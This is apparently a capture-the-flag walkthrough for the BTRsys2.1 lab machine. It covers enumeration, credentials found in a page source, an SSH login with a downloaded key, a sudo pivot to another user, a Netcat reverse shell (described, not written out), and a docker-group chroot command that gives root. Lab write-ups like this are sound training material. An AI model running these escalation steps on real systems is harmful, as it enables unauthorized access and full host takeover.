# BTRsys2.1

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ff:ef:03:c0:41:26:f8:d9:40:f9:b0:8d:74:13:6d:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq2FCQ9AttVO01VjMw990jECdCUsOtV1JWvTOB+j4vqJfMFL7eyP14rftoSNq7/lp1jCunCTYzIFT/eWbl4lFLVsiDchhoJOEEltV8vaPBTm36u/osXROFqrDm6tXQ+Rz7Ns2cQUxeUdekqByExOsOMg+PuhHFjP6LuU8vVh6EtuuI5xBBqBYesLcA2GG8bMjDHY9+keMlrraxxKczRraugME90OAZ5dp5L7AltNHV6+L+ghiL8siVMWaj3vqNxXakiMLsfiEoX6yT8NI0unNHSF32RbdDfVm0jUsGr9Ld2zIo4rXrCAby4b3/sooqOB5AZxjBvTeShGhJuhtpagxd
|   256 da:ef:71:d5:9e:da:03:34:35:ec:96:71:40:f7:d0:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBs5wvIb5mD2yLb4WLbPNdL6c7HlHXBJbNebHZrryumVTR8Ga9QRA4kogQD0ANBMkyaZuJxdcamL8lZ64PfXqBs=
|   256 ee:b8:32:7a:1e:7a:1d:81:e1:07:1f:de:ee:81:a1:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO9Qf9uJxdtXoRhr/jqFJp17VRK8C8RhSyZ+3pHj79Kr
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)

```

### Port 80 - HTTP

Found a hidden `hidden_text` folder after checking the website's `robots.txt` file

<figure><img src="../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>



Found a `sec.dic` file inside the `hidden_text` directory containing a list of possible directories.

<figure><img src="../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>



Found `pwned.vuln` in the `sec.dic` wordlist. It returned a 301 redirect, and checking the page source revealed credentials.

<figure><img src="../.gitbook/assets/image (689).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

### Port 21 - FTP&#x20;

The FTP credentials worked with the username `ftpuser`. I logged in and downloaded the `note` file and `id_rsa` key. After checking the note, I discovered the username `ariana`. Using the SSH key, I was able to log in as Ariana and get shell access on port 22.

<figure><img src="../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

### Port 22 - SSH

<figure><img src="../.gitbook/assets/image (692).png" alt=""><figcaption></figcaption></figure>

Ran `sudo -l` and found that I could execute `messenger.sh` as the user `selena`. I used `sudo -u selena` to run the script and switch to Selena's context.

#### Sudo as another user

```
(otheruser) NOPASSWD: /path/to/script.sh

sudo -u otheruser /pathto/script.sh
```

<figure><img src="../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (694).png" alt=""><figcaption></figcaption></figure>

The `messenger.sh` script appeared to launch a messaging service. I used a Netcat reverse shell to connect back to my Kali machine and successfully gained shell access as `selena`&#x20;

<figure><img src="../.gitbook/assets/image (695).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation

Found that `selena` was a member of the `docker` group and exploited this privilege to escalate to root

#### Docker group priv esc&#x20;

```
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash


alpine is the container name, change it if you come across any other name, by checking the list
docker image ls

```

<figure><img src="../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

